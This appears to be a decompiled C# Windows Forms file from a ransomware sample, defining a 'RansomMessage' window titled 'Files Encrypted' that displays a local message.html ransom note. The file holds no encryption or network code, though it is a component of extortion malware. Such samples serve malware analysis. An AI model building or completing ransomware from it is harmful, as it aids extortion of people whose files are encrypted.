using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace ekati;

public class RansomMessage : Form
{
	private IContainer components = null;

	private WebBrowser webBrowser1;

	public RansomMessage()
	{
		InitializeComponent();
		string currentDirectory = Directory.GetCurrentDirectory();
		webBrowser1.set_Url(new Uri($"file:///{currentDirectory}/message.html"));
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		webBrowser1 = new WebBrowser();
		((Control)this).SuspendLayout();
		((Control)webBrowser1).set_Dock((DockStyle)5);
		((Control)webBrowser1).set_Location(new Point(0, 0));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		webBrowser1.set_ScrollBarsEnabled(false);
		((Control)webBrowser1).set_Size(new Size(984, 621));
		((Control)webBrowser1).set_TabIndex(0);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(984, 621));
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("RansomMessage");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Files Encrypted");
		((Control)this).ResumeLayout(false);
	}
}
